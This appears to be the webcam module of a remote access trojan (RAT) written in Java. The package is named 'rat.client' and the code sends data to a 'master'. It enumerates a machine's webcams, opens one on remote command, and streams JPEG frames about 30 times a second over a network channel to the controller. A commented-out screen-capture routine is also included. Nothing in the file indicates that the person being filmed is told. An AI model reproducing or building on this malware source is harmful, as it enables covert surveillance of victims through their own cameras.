package rat.client.functions;

import com.github.sarxos.webcam.Webcam;
import org.jboss.netty.channel.Channel;
import rat.master.WebcamInfo;
import rat.packets.WebcamDataPacket;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class RemoteWebcam {

    private static int webcamJobCount;

    private Map<String, Webcam> webcams = new HashMap<>();
    private Map<Integer, WebcamJob> webcamJobs = new HashMap<>();
    private Map<String, Integer> webcamThreadCount = new HashMap<>();

    private void refreshDevices() {
        webcams.clear();
        for (Webcam webcam : Webcam.getWebcams()) {
            webcams.put(webcam.getName(), webcam);
        }
    }

    public int startBroadcast(Channel channel, String deviceName, int frameId) {
        refreshDevices();

        Webcam webcam = webcams.get(deviceName);
        if (webcam == null) {
            return -1;
        }

        WebcamJob webcamJob = new WebcamJob(channel, webcam, frameId);
        webcamJobCount++;
        webcamJobs.put(webcamJobCount, webcamJob);

        Integer currentThreadCount = webcamThreadCount.get(deviceName);
        if (currentThreadCount == null) {
            currentThreadCount = 0;
            webcamJob.openWebcam();
        }
        webcamThreadCount.put(deviceName, currentThreadCount + 1);

        webcamJob.start(); // start sending pictures

        return webcamJobCount;
    }

    public void stopBroadcast(int jobId) {
        WebcamJob webcamJob = webcamJobs.remove(jobId);
        if (webcamJob == null) {
            return; // was not in the table
        }

        webcamJob.finish();

        String webcamName = webcamJob.getWebcamName();
        Integer currentThreadCount = webcamThreadCount.get(webcamName);

        if (currentThreadCount == 1) {
            webcamThreadCount.remove(webcamName);
            webcamJob.closeWebcam();
        } else {
            webcamThreadCount.put(webcamName, currentThreadCount - 1);
        }
    }

//    public void takeScreenshot(Channel channel, String deviceName) {
//        refreshDevices();
//        if (!webcams.containsKey(deviceName)) {
//            return;
//        }
//
//        Webcam webcam = webcams.get(deviceName);
//        webcam.setViewSize(WebcamResolution.VGA.getSize());
//        webcam.open();
//
//        try {
//            ImageIO.write(webcam.getImage(), "PNG", new File("hello-world.png"));
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//    }

    public WebcamInfo[] getWebcamInformations() {
        refreshDevices();
        List<WebcamInfo> infoList = new ArrayList<>();

        for (Webcam webcam : webcams.values()) {
            infoList.add(new WebcamInfo(webcam.getName(), webcam.getDevice().getResolution()));
        }

        return infoList.toArray(new WebcamInfo[0]);
    }

    private static class WebcamJob extends Thread {

        private Channel channel;

        private Webcam webcam;

        private int webcamGUIId;

        private volatile boolean active;

        private ByteArrayOutputStream out = new ByteArrayOutputStream();

        public WebcamJob(Channel channel, Webcam webcam, int webcamGUIId) {
            this.channel = channel;
            this.webcam = webcam;
            this.webcamGUIId = webcamGUIId;
        }

        @Override
        public void run() {
            active = true;

            while (active) {
                byte[] imageData = captureWebcam();
                //  IPacket packet = new WebcamDataPacket(frameWidth, frameHeight, screenshotBytes);
                channel.write(new WebcamDataPacket(webcamGUIId, imageData));
                System.out.println("Image sent! Size: " + imageData.length);

                try {
                    Thread.sleep(1000 / 30);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }

        private byte[] captureWebcam() {
            out.reset();

//            Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
//
//            int bestHeight = (int) Math.min(frameHeight, screenSize.getHeight());
//            int bestWidth = (int) Math.min(frameWidth, screenSize.getWidth());
//
//            BufferedImage image = robot.createScreenCapture(screenSize);
//
//            Image scaledImage = image.getScaledInstance(bestWidth, bestHeight, Image.SCALE_SMOOTH);
//            BufferedImage bimage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null),
//                    BufferedImage.TYPE_INT_RGB);
//
//            Graphics2D bGr = bimage.createGraphics();
//            bGr.drawImage(scaledImage, 0, 0, null);
//            bGr.dispose();
//            image = bimage;

            BufferedImage image = webcam.getImage();

            try {
                ImageIO.write(image, "jpg", out);
            } catch (IOException e) {
                e.printStackTrace();
            }

            return out.toByteArray();
        }

        public void openWebcam() {
            webcam.open();
        }

        public void closeWebcam() {
            webcam.close();
        }

        public void finish() {
            active = false;
        }

        public String getWebcamName() {
            return webcam.getName();
        }
    }


}
